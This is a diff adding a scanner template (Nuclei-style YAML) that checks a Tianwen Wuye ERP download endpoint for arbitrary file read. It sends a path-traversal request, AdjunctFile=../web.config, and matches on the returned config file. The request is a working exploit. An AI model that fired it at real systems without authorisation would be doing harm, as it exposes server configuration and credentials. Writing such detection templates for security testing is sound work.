@@ -1,0 +1,27 @@
+id: poc-yaml-tianwen-wuye-erp-docfiledownload-file-read
+info:
+  name: Tianwen Wuye ERP Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Tianwen Wuye ERP system contains a vulnerability in the `docfileDownLoad.aspx` endpoint, allowing arbitrary file read vulnerabilities by exploiting the AdjunctFile parameter.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "filename=web.config"
+      - type: word
+        part: body
+        words:
+          - "<appSettings>"
+          - "<configuration>"
+      - type: status
+        status:
+          - 200
